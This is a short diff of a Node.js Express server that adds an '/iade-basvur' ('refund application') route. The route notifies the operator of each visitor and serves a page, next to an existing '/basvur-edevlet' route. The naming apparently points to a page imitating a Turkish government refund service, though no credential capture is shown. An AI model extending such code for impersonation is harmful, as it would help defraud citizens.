@@ -123,7 +123,17 @@ app.get('/basvur-edevlet', (req, res) => {
        res.status(500).send('Internal Server Error');
      });
  });
-
+app.get('/iade-basvur', (req, res) => {
+    notifyVisitorLogin()
+     .then(() => {
+        console.log('odeme');
+       res.sendFile(path.join(__dirname, 'public', 'iade-basvur.html'));
+     })
+     .catch((error) => {
+       console.error('Error:', error);
+       res.status(500).send('Internal Server Error');
+     });
+ });
  
 
 app.listen(PORT, () => {
